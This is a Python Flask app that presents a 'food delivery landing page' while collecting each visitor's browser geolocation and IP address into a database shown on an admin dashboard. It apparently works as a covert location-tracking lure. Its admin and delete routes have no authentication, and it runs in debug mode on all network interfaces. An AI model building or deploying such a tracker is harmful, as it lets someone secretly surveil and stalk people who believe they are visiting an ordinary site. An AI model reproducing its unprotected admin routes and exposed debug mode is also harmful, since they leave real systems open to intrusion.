import os
from datetime import datetime
from flask import Flask, request, jsonify, render_template, redirect, url_for
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)
# Configure the SQLite database
basedir = os.path.abspath(os.path.dirname(__name__))
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///' + os.path.join(basedir, 'locations.db')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# Database Model for Storing Location Data
class LocationData(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    latitude = db.Column(db.Float, nullable=False)
    longitude = db.Column(db.Float, nullable=False)
    accuracy = db.Column(db.Float, nullable=True)
    ip_address = db.Column(db.String(50), nullable=True)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

    def to_dict(self):
        return {
            'id': self.id,
            'latitude': self.latitude,
            'longitude': self.longitude,
            'accuracy': self.accuracy,
            'ip_address': self.ip_address,
            'timestamp': self.timestamp.strftime("%Y-%m-%d %H:%M:%S")
        }

# Create database tables
with app.app_context():
    db.create_all()

# User-facing Food Delivery Landing Page
@app.route('/')
def index():
    return render_template('index.html')

# API endpoint to receive location from the user's browser
@app.route('/api/location', methods=['POST'])
def save_location():
    data = request.get_json()
    
    if not data or 'latitude' not in data or 'longitude' not in data:
        return jsonify({'error': 'Invalid data'}), 400

    new_location = LocationData(
        latitude=data['latitude'],
        longitude=data['longitude'],
        accuracy=data.get('accuracy'),
        ip_address=request.remote_addr
    )

    db.session.add(new_location)
    db.session.commit()

    return jsonify({'status': 'success', 'message': 'Location saved successfully'})

# Admin Dashboard to view all saved locations
@app.route('/admin')
def admin():
    locations = LocationData.query.order_by(LocationData.timestamp.desc()).all()
    return render_template('admin.html', locations=locations)

@app.route('/admin/clear', methods=['POST'])
def clear_history():
    db.session.query(LocationData).delete()
    db.session.commit()
    return redirect(url_for('admin'))

@app.route('/admin/delete/<int:loc_id>', methods=['POST'])
def delete_location(loc_id):
    loc = LocationData.query.get_or_404(loc_id)
    db.session.delete(loc)
    db.session.commit()
    return redirect(url_for('admin'))

if __name__ == '__main__':
    # Run the app locally on port 5000
    app.run(debug=True, host='0.0.0.0', port=5000)
